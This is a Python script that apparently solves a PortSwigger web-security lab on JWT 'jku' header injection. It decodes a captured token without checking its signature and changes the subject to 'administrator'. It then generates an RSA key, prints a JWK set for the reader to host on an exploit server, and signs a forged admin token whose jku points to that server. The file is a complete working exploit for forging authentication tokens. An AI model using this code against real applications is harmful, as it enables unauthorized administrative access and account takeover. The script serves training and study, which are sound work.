import jwt
import base64
import uuid
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend

# STEP 1: Generate RSA key pair
private_key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
)
public_key = private_key.public_key()

# STEP 2: Token từ lab (/my-account response header)
token = "eyJraWQiOiIwYWQ4MGU2OS03MGJiLTRjMDktOWJiMC0zYTlhNDI1MDIzNDAiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTc1MDI2OTA5Nywic3ViIjoid2llbmVyIn0...."

# STEP 3: Decode token (without verifying signature)
decoded_token = jwt.decode(token, options={"verify_signature": False})
decoded_header = jwt.get_unverified_header(token)

print(f"Original header: {decoded_header}")
print(f"Original payload: {decoded_token}")

# STEP 4: Modify payload (become admin)
decoded_token['sub'] = 'administrator'
print(f"\nModified payload: {decoded_token}")

# STEP 5: Export public key to JWK (to be hosted on exploit server)
public_numbers = public_key.public_numbers()
n = base64.urlsafe_b64encode(
    public_numbers.n.to_bytes((public_numbers.n.bit_length() + 7) // 8, byteorder='big')
).rstrip(b'=').decode('utf-8')

e = base64.urlsafe_b64encode(
    public_numbers.e.to_bytes((public_numbers.e.bit_length() + 7) // 8, byteorder='big')
).rstrip(b'=').decode('utf-8')

# Generate new kid
kid = str(uuid.uuid4())# Random string.

jwk_set = {
    "keys": [
        {
            "kty": "RSA",
            "e": e,
            "n": n,
            "kid": kid
        }
    ]
}

print("\n📤 Paste this JWK set to your exploit server:")
print(jwk_set)

# STEP 6: Create JWT header with 'jku' pointing to exploit server
jku_url = "https://exploit-0a26003b0328ddfa806c939a01890006.exploit-server.net/jwt.json"

new_headers = {
    "alg": "RS256",
    "typ": "JWT",
    "kid": kid,
    "jku": jku_url
}

# STEP 7: Sign token with private key
modified_token = jwt.encode(
    decoded_token,
    private_key,
    algorithm='RS256',
    headers=new_headers
)

print("\n🎯 Final forged JWT (with jku header):")
print(modified_token)
